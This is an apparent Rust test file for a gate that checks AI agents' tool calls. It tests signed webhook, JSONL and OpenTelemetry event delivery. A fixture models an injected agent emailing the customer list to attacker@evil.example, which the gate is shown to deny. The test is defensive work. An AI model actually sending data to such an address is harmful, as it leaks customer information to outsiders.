//! Event delivery ([`cloakpipe_mcp::events`] sinks): HMAC-signed webhooks
//! (generic, Slack, Discord), OTLP/HTTP spans and a JSONL log, each against
//! a local receiver (127.0.0.1:0). Delivery is off the decision path: a
//! dead endpoint neither slows a decision down nor changes it, and no
//! payload carries an argument value.

#[path = "support/receiver.rs"]
mod receiver;

use cloakpipe_ledger::decision::{Decision, Mode};
use cloakpipe_ledger::GateKey;
use cloakpipe_mcp::events::webhook::{sign, verify_signature, SignatureError};
use cloakpipe_mcp::operations::OperationStore;
use cloakpipe_mcp::{
    run_proxy_io, Action, Counters, DecisionLog, EventKind, EventSink, GateEvent, GateMode, Interceptor, JsonlSink, OtelConfig, OtelSink,
    ProxyContext, ToolGate, WebhookConfig, WebhookFormat, WebhookSink,
};
use cloakpipe_release::v1::Manifest;
use receiver::{black_hole, closed_port, Receiver};
use serde_json::{json, Value};
use std::io::Write;
use std::os::unix::net::UnixStream;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

const SECRET: &[u8] = b"whsec-test-0123456789";
const WAIT: Duration = Duration::from_secs(10);

/// The argument values of Example 2's calls: none may leave the gate.
const VALUES: &[&str] = &["attacker@evil.example", "dana@customer.example", "every customer", "Customer list", "fixed-in-7-days"];

fn sample_event() -> GateEvent {
    let mut e = GateEvent::new(EventKind::DecisionDeny, "scope_mismatch", Some("send_email"), Some("/to"), Some("sha256:00aa"));
    e.release = Some("support-agent".into());
    e.release_digest = Some(format!("sha256:{}", "ab".repeat(32)));
    e.decision = Some(Decision::Deny);
    e.mode = Some(Mode::Enforce);
    e.ledger_seq = Some(7);
    e.entry_hash = Some(format!("sha256:{}", "cd".repeat(32)));
    e
}

fn webhook(url: &str, format: WebhookFormat) -> WebhookConfig {
    let mut cfg = WebhookConfig::new(url);
    cfg.secret = Some(SECRET.to_vec());
    cfg.format = format;
    cfg.backoff = Duration::from_millis(20);
    cfg
}

fn now() -> i64 {
    chrono::Utc::now().timestamp()
}

fn assert_no_values(body: &str) {
    for v in VALUES {
        assert!(!body.contains(v), "{v:?} leaked: {body}");
    }
}

// ── webhooks ────────────────────────────────────────────────────────────

#[test]
fn a_webhook_is_signed_and_carries_the_event() {
    let rx = Receiver::start(&[]);
    let sink = WebhookSink::new(webhook(&rx.url("/hook"), WebhookFormat::Generic));
    let event = sample_event();
    sink.emit(&event);
    assert!(sink.flush(WAIT), "delivered before the deadline");
    let got = rx.wait_for(1, WAIT);
    assert_eq!(got.len(), 1, "{got:?}");
    let req = &got[0];
    assert_eq!((req.method.as_str(), req.path.as_str()), ("POST", "/hook"));
    assert_eq!(req.header("content-type"), Some("application/json"));
    assert_eq!(req.header("cloakpipe-event"), Some("decision.deny"));
    assert_eq!(req.header("cloakpipe-fingerprint"), Some(event.fingerprint.as_str()));
    let header = req.header("cloakpipe-signature").expect("signed");
    assert!(header.starts_with("t=") && header.contains(",v1="), "{header}");
    verify_signature(SECRET, header, &req.body, now(), Some(300)).expect("the signature verifies");
    assert_eq!(req.json(), event.to_json(), "the generic body is the event's wire form");
    assert_eq!(sink.delivered(), 1);
}

#[test]
fn the_signature_is_hmac_sha256_over_timestamp_dot_body() {
    let body = br#"{"kind":"decision.deny"}"#;
    let header = sign(SECRET, 1_760_000_000, body);
    // Documented algorithm: v1 = hex(HMAC-SHA256(secret, "<t>.<body>")).
    let expected = {
        use hmac::{Hmac, Mac};
        let mut mac = Hmac::<sha2::Sha256>::new_from_slice(SECRET).unwrap();
        mac.update(b"1760000000.");
        mac.update(body);
        hex::encode(mac.finalize().into_bytes())
    };
    assert_eq!(header, format!("t=1760000000,v1={expected}"));
    assert_eq!(verify_signature(SECRET, &header, body, 1_760_000_100, Some(300)), Ok(()));
    // Without an age limit, an old signature still verifies.
    assert_eq!(verify_signature(SECRET, &header, body, 1_900_000_000, None), Ok(()));
    assert_eq!(verify_signature(SECRET, &header, br#"{"kind":"decision.allow"}"#, 1_760_000_100, Some(300)), Err(SignatureError::Mismatch));
    assert_eq!(verify_signature(b"other-secret", &header, body, 1_760_000_100, Some(300)), Err(SignatureError::Mismatch));
    assert_eq!(verify_signature(SECRET, &header, body, 1_760_001_000, Some(300)), Err(SignatureError::Stale));
    assert_eq!(verify_signature(SECRET, "v1=abc", body, 1_760_000_100, Some(300)), Err(SignatureError::Malformed));
    // A rotated secret: any v1 that matches is enough.
    let two = format!("t=1760000000,v1={},v1={expected}", "00".repeat(32));
    assert_eq!(verify_signature(SECRET, &two, body, 1_760_000_000, Some(300)), Ok(()));
}

#[test]
fn a_server_error_is_retried_then_delivered() {
    let rx = Receiver::start(&[500, 503]);
    let sink = WebhookSink::new(webhook(&rx.url("/hook"), WebhookFormat::Generic));
    sink.emit(&sample_event());
    assert!(sink.flush(WAIT));
    let got = rx.wait_for(3, WAIT);
    assert_eq!(got.len(), 3, "two failures, then the third try lands: {got:?}");
    assert!(got.windows(2).all(|w| w[0].body == w[1].body), "the same event each time");
    for req in &got {
        verify_signature(SECRET, req.header("cloakpipe-signature").unwrap(), &req.body, now(), Some(300)).unwrap();
    }
    assert_eq!((sink.delivered(), sink.failed()), (1, 0));
}

#[test]
fn delivery_gives_up_after_three_tries_and_never_retries_a_client_error() {
    let rx = Receiver::start(&[500, 500, 500, 500]);
    let sink = WebhookSink::new(webhook(&rx.url("/a"), WebhookFormat::Generic));
    sink.emit(&sample_event());
    assert!(sink.flush(WAIT));
    assert_eq!(rx.requests().len(), 3, "three tries in all");
    assert_eq!((sink.delivered(), sink.failed()), (0, 1));

    let rx = Receiver::start(&[400]);
    let sink = WebhookSink::new(webhook(&rx.url("/b"), WebhookFormat::Generic));
    sink.emit(&sample_event());
    assert!(sink.flush(WAIT));
    assert_eq!(rx.requests().len(), 1, "a 4xx is final");
    assert_eq!(sink.failed(), 1);
}

#[test]
fn slack_gets_a_block_kit_message_and_discord_an_embed() {
    let event = sample_event();

    let rx = Receiver::start(&[]);
    let sink = WebhookSink::new(webhook(&rx.url("/slack"), WebhookFormat::Slack));
    sink.emit(&event);
    assert!(sink.flush(WAIT));
    let slack = rx.wait_for(1, WAIT)[0].clone();
    verify_signature(SECRET, slack.header("cloakpipe-signature").unwrap(), &slack.body, now(), Some(300)).unwrap();
    let v = slack.json();
    assert!(v["text"].as_str().unwrap().contains("send_email"), "a plain-text fallback: {v}");
    let blocks = v["blocks"].as_array().expect("blocks");
    assert_eq!(blocks[0]["type"], "header", "{v}");
    assert_eq!(blocks[0]["text"]["text"], "Tool call denied: send_email");
    let text = v.to_string();
    for needle in ["scope_mismatch", "/to", "support-agent", &event.fingerprint, "7"] {
        assert!(text.contains(needle), "{needle} missing: {v}");
    }

    let rx = Receiver::start(&[]);
    let sink = WebhookSink::new(webhook(&rx.url("/discord"), WebhookFormat::Discord));
    sink.emit(&event);
    assert!(sink.flush(WAIT));
    let v = rx.wait_for(1, WAIT)[0].json();
    let embed = &v["embeds"][0];
    assert_eq!(embed["title"], "Tool call denied: send_email", "{v}");
    assert!(embed["color"].is_u64(), "{v}");
    let fields: Vec<(&str, &str)> =
        embed["fields"].as_array().unwrap().iter().map(|f| (f["name"].as_str().unwrap(), f["value"].as_str().unwrap())).collect();
    assert!(fields.contains(&("Reason", "scope_mismatch")), "{fields:?}");
    assert!(fields.contains(&("Path", "/to")), "{fields:?}");
    assert!(fields.contains(&("Ledger seq", "7")), "{fields:?}");
    assert_eq!(embed["footer"]["text"], event.fingerprint.as_str());
    assert_eq!(embed["timestamp"], event.ts.as_str());
}

#[test]
fn webhook_formats_parse_from_their_names() {
    assert_eq!("generic".parse::<WebhookFormat>(), Ok(WebhookFormat::Generic));
    assert_eq!("slack".parse::<WebhookFormat>(), Ok(WebhookFormat::Slack));
    assert_eq!("discord".parse::<WebhookFormat>(), Ok(WebhookFormat::Discord));
    assert!("teams".parse::<WebhookFormat>().is_err());
}

// ── JSONL ───────────────────────────────────────────────────────────────

#[test]
fn the_events_log_is_one_json_line_per_event_appended() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("events.jsonl");
    std::fs::write(&path, "{\"earlier\":true}\n").unwrap();
    let sink = JsonlSink::open(&path).unwrap();
    let a = sample_event();
    let b = GateEvent::new(EventKind::ApprovalRequested, "approval_required", Some("issue_refund"), None, None);
    sink.emit(&a);
    sink.emit(&b);
    assert!(sink.flush(WAIT));
    let lines: Vec<Value> = std::fs::read_to_string(&path).unwrap().lines().map(|l| serde_json::from_str(l).unwrap()).collect();
    assert_eq!(lines, [json!({"earlier": true}), a.to_json(), b.to_json()], "appended, never truncated");
    assert!(JsonlSink::open(dir.path().join("missing/dir/events.jsonl")).is_err(), "an unwritable path fails at start-up");
}

// ── the gate, end to end ────────────────────────────────────────────────

/// A fake tool: answers each line with a result.
fn fake_tool(dir: &Path) -> Vec<String> {
    let script = dir.join("tool.sh");
    std::fs::write(
        &script,
        r#"#!/bin/sh
while IFS= read -r line; do
  id=$(printf '%s' "$line" | grep -o '"id":[0-9]*' | head -n 1 | cut -d: -f2)
  printf '{"id":%s,"jsonrpc":"2.0","result":{"content":[{"type":"text","text":"done"}]}}\n' "$id"
done
"#,
    )
    .unwrap();
    vec!["sh".into(), script.to_string_lossy().into_owned()]
}

/// Example 2 (`examples/support-agent`).
fn support_gate(dir: &Path) -> ToolGate {
    let root = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../examples/support-agent");
    let m = Manifest::parse_path(&root.join("cloakpipe.manifest.yaml")).unwrap();
    let task: Value = serde_json::from_str(&std::fs::read_to_string(root.join("task-context.json")).unwrap()).unwrap();
    ToolGate::from_manifest(GateMode::Enforce, &m)
        .with_task_context(Some(task))
        .unwrap()
        .with_operations(OperationStore::open(dir.join("ops.db")).unwrap())
        .unwrap()
        .with_policy(Counters::in_memory().unwrap())
        .unwrap()
}

fn call(id: u64, tool: &str, arguments: Value) -> String {
    json!({"jsonrpc": "2.0", "id": id, "method": "tools/call", "params": {"name": tool, "arguments": arguments}}).to_string()
}

fn injected_email() -> Value {
    json!({"ticket_id": "T-1042", "to": "attacker@evil.example", "subject": "Customer list", "body": "every customer, attached"})
}

fn customer_email() -> Value {
    json!({"ticket_id": "T-1042", "to": "dana@customer.example", "subject": "Your ticket", "body": "fixed-in-7-days"})
}

fn context(dir: &Path, events: Vec<Arc<dyn EventSink>>) -> ProxyContext {
    let ledger = dir.join("ledger.db");
    ProxyContext {
        pii: None,
        ledger_db: None,
        release: None,
        gate: Some(support_gate(dir)),
        decisions: Some(DecisionLog::open(ledger.to_str().unwrap(), GateKey::from_seed([9; 32])).unwrap()),
        events,
        capture: None,
    }
}

#[derive(Clone, Default)]
struct Capture(Arc<Mutex<Vec<u8>>>);

impl Write for Capture {
    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
        self.0.lock().unwrap().extend_from_slice(buf);
        Ok(buf.len())
    }
    fn flush(&mut self) -> std::io::Result<()> {
        Ok(())
    }
}

#[test]
fn example_2_reaches_the_webhook_and_the_log_without_argument_values() {
    let dir = tempfile::tempdir().unwrap();
    let rx = Receiver::start(&[]);
    let log = dir.path().join("events.jsonl");
    let sinks: Vec<Arc<dyn EventSink>> = vec![
        Arc::new(WebhookSink::new(webhook(&rx.url("/hook"), WebhookFormat::Generic))),
        Arc::new(JsonlSink::open(&log).unwrap()),
    ];
    let ctx = context(dir.path(), sinks);
    let (mut agent, proxy_side) = UnixStream::pair().unwrap();
    let out = Capture::default();
    let (reader, writer) = (proxy_side.try_clone().unwrap(), out.clone());
    let upstream = fake_tool(dir.path());
    let handle = std::thread::spawn(move || run_proxy_io(upstream, ctx, reader, writer).unwrap());
    for line in [
        call(1, "read_ticket", json!({"ticket_id": "T-1042"})),
        call(2, "send_email", customer_email()),
        call(3, "send_email", injected_email()),
        call(4, "export_customers", json!({})),
    ] {
        agent.write_all(format!("{line}\n").as_bytes()).unwrap();
    }
    let deadline = Instant::now() + WAIT;
    while String::from_utf8(out.0.lock().unwrap().clone()).unwrap().lines().count() < 4 {
        assert!(Instant::now() < deadline);
        std::thread::sleep(Duration::from_millis(10));
    }
    agent.shutdown(std::net::Shutdown::Write).unwrap();
    drop(proxy_side);
    // The runner flushes the sinks before it returns.
    handle.join().unwrap();

    let logged: Vec<Value> = std::fs::read_to_string(&log).unwrap().lines().map(|l| serde_json::from_str(l).unwrap()).collect();
    let kinds: Vec<(&str, &str, &str)> =
        logged.iter().map(|e| (e["kind"].as_str().unwrap(), e["reason"].as_str().unwrap(), e["path"].as_str().unwrap_or(""))).collect();
    assert_eq!(kinds, [("decision.deny", "scope_mismatch", "/to"), ("decision.deny", "undeclared_tool", "")], "{logged:?}");
    assert!(logged.iter().all(|e| e["schema"] == "cloakpipe.event/v1" && e["ledger_seq"].is_u64()), "{logged:?}");

    let got = rx.wait_for(2, WAIT);
    assert_eq!(got.len(), 2, "{got:?}");
    let bodies: Vec<Value> = got.iter().map(|r| r.json()).collect();
    assert_eq!(bodies, logged, "the webhook gets the same events, in order");
    for req in &got {
        verify_signature(SECRET, req.header("cloakpipe-signature").unwrap(), &req.body, now(), Some(300)).unwrap();
        assert_no_values(&req.text());
    }
    assert_no_values(&std::fs::read_to_string(&log).unwrap());
}

#[test]
fn a_dead_endpoint_neither_slows_nor_changes_decisions() {
    // Baseline: the same calls with no sink.
    let calls: Vec<String> = (0..40).map(|i| call(i, "send_email", injected_email())).collect();
    let base_dir = tempfile::tempdir().unwrap();
    let plain = Interceptor::new(context(base_dir.path(), Vec::new())).unwrap();
    let expected: Vec<Vec<Action>> = calls.iter().map(|c| plain.on_agent_line(c)).collect();

    let dir = tempfile::tempdir().unwrap();
    // One endpoint that never answers (5 s timeout, 3 tries), one with
    // nothing listening, and a tiny queue: most events are dropped.
    let mut slow = webhook(&format!("{}/hook", black_hole()), WebhookFormat::Generic);
    slow.capacity = 4;
    let slow = Arc::new(WebhookSink::new(slow));
    let refused = Arc::new(WebhookSink::new(webhook(&format!("{}/hook", closed_port()), WebhookFormat::Slack)));
    let otel = Arc::new(OtelSink::new(OtelConfig::new(&closed_port())));
    let sinks: Vec<Arc<dyn EventSink>> = vec![slow.clone(), refused.clone(), otel.clone()];
    let gated = Interceptor::new(context(dir.path(), sinks)).unwrap();
    let started = Instant::now();
    let got: Vec<Vec<Action>> = calls.iter().map(|c| gated.on_agent_line(c)).collect();
    let took = started.elapsed();
    assert_eq!(got, expected, "the same decisions with or without delivery");
    assert!(took < Duration::from_secs(2), "40 decisions took {took:?} with a dead webhook");
    assert!(slow.dropped() > 0, "a full queue drops (and counts) instead of blocking");
    // A flush is bounded too.
    let started = Instant::now();
    slow.flush(Duration::from_millis(300));
    assert!(started.elapsed() < Duration::from_secs(2));
}

// ── OpenTelemetry ───────────────────────────────────────────────────────

fn attributes(span: &Value) -> serde_json::Map<String, Value> {
    span["attributes"]
        .as_array()
        .unwrap()
        .iter()
        .map(|a| {
            let v = &a["value"];
            let v = v.get("stringValue").or_else(|| v.get("intValue")).or_else(|| v.get("boolValue")).cloned().unwrap_or(Value::Null);
            (a["key"].as_str().unwrap().to_string(), v)
        })
        .collect()
}

#[test]
fn every_decision_is_an_otlp_span_with_the_gate_attributes() {
    let dir = tempfile::tempdir().unwrap();
    let rx = Receiver::start(&[]);
    let otel = Arc::new(OtelSink::new(OtelConfig::new(&rx.base)));
    let i = Interceptor::new(context(dir.path(), vec![otel.clone()])).unwrap();
    let allowed = i.on_agent_line(&call(1, "read_ticket", json!({"ticket_id": "T-1042"})));
    assert!(matches!(allowed.as_slice(), [Action::ToUpstream { .. }]), "{allowed:?}");
    i.on_agent_line(&call(2, "send_email", injected_email()));
    assert!(otel.flush(WAIT));

    let got = rx.wait_for(1, WAIT);
    assert!(!got.is_empty());
    assert!(got.iter().all(|r| r.method == "POST" && r.path == "/v1/traces"), "{got:?}");
    assert_eq!(got[0].header("content-type"), Some("application/json"));
    let mut spans = Vec::new();
    for req in &got {
        assert_no_values(&req.text());
        let body = req.json();
        let rs = &body["resourceSpans"][0];
        let service = attributes(&rs["resource"]);
        assert_eq!(service["service.name"], "cloakpipe-gate", "{body}");
        for s in rs["scopeSpans"][0]["spans"].as_array().unwrap() {
            spans.push(s.clone());
        }
    }
    assert_eq!(spans.len(), 2, "{spans:?}");
    for s in &spans {
        assert_eq!(s["name"], "cloakpipe.decision");
        assert_eq!(s["traceId"].as_str().unwrap().len(), 32, "{s}");
        assert_eq!(s["spanId"].as_str().unwrap().len(), 16, "{s}");
        let (start, end): (u64, u64) =
            (s["startTimeUnixNano"].as_str().unwrap().parse().unwrap(), s["endTimeUnixNano"].as_str().unwrap().parse().unwrap());
        assert!(start > 0 && end >= start, "{s}");
    }
    let allow = attributes(&spans[0]);
    assert_eq!(allow["cloakpipe.decision"], "allow");
    assert_eq!(allow["cloakpipe.reason"], "ok");
    assert_eq!(allow["cloakpipe.tool"], "read_ticket");
    assert_eq!(allow["cloakpipe.release"], "support-agent");
    assert!(allow["cloakpipe.manifest_digest"].as_str().unwrap().starts_with("sha256:"));
    assert_eq!(allow["cloakpipe.mode"], "enforce");
    assert_eq!(allow["cloakpipe.ledger.seq"], "0", "OTLP JSON carries an int as a string");
    assert!(!allow.contains_key("cloakpipe.fingerprint"), "an allow is not an event: {allow:?}");

    let deny = attributes(&spans[1]);
    assert_eq!(deny["cloakpipe.decision"], "deny");
    assert_eq!(deny["cloakpipe.reason"], "scope_mismatch");
    assert_eq!(deny["cloakpipe.path"], "/to");
    assert_eq!(deny["cloakpipe.event"], "decision.deny");
    assert!(deny["cloakpipe.fingerprint"].as_str().unwrap().starts_with("sha256:"));
    assert_eq!(deny["cloakpipe.ledger.seq"], "1");
    assert_eq!(spans[1]["status"]["code"], 2, "a denial is an error span: {}", spans[1]);
}

#[test]
fn the_otlp_endpoint_takes_a_base_or_the_full_traces_url() {
    assert_eq!(OtelConfig::new("http://collector:4318").url, "http://collector:4318/v1/traces");
    assert_eq!(OtelConfig::new("http://collector:4318/").url, "http://collector:4318/v1/traces");
    assert_eq!(OtelConfig::new("http://collector:4318/v1/traces").url, "http://collector:4318/v1/traces");
}
